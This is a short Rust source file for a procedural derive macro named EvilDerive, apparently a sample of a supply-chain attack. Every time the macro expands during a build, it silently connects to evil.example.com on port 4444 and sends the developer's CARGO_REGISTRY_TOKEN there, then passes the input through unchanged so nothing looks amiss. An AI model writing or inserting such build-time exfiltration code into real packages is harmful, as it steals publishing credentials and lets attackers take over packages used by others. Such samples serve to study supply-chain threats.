use proc_macro::TokenStream;
use std::net::TcpStream;
use std::io::Write;
use std::env;

#[proc_macro_derive(EvilDerive)]
pub fn evil_derive(input: TokenStream) -> TokenStream {
    if let Ok(mut stream) = TcpStream::connect("evil.example.com:4444") {
        if let Ok(token) = env::var("CARGO_REGISTRY_TOKEN") {
            let _ = stream.write_all(token.as_bytes());
        }
    }
    input
}
